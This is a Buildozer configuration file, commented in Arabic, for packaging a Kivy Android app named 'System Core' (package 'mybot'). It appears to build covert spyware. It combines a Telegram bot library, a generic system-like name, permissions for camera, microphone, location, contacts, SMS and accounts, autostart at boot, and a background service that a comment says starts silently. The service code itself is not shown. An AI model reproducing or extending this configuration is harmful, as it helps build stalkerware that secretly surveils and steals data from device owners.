[app]

# اسم التطبيق وعنوانه
title = System Core
package.name = mybot
package.domain = org.mybot
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0

# المكتبات الأساسية
requirements = python3, kivy, pytelegrambotapi, pyjnius, requests, plyer

# الصلاحيات المحدثة لضمان استقرار Foreground Service على أندرويد الحديث
android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, android.permission.MANAGE_EXTERNAL_STORAGE, android.permission.CAMERA, android.permission.RECORD_AUDIO, android.permission.ACCESS_FINE_LOCATION, android.permission.ACCESS_COARSE_LOCATION, android.permission.FOREGROUND_SERVICE, android.permission.FOREGROUND_SERVICE_LOCATION, android.permission.FOREGROUND_SERVICE_CAMERA, android.permission.READ_CONTACTS, android.permission.READ_SMS, android.permission.GET_ACCOUNTS, android.permission.RECEIVE_BOOT_COMPLETED

# تفعيل الخدمة الخلفية مع تعريفها كخدمة أمامية
android.services = Mybot:service.py

# إضافة الاستعلامات لضمان التشغيل التلقائي عند بدء الجهاز
android.add_manifest_queries = <intent><action android:name="android.intent.action.BOOT_COMPLETED" /></intent>

# إعدادات التوافق (API 35 لضمان العمل على أحدث أجهزة الأندرويد)
android.minapi = 21
android.api = 35
android.archs = arm64-v8a, armeabi-v7a
android.enable_androidx = True

# إعدادات الواجهة (تجعل التطبيق يبدأ كخدمة صامتة)
orientation = portrait
fullscreen = 1

[buildozer]
log_level = 2
warn_on_root = 1

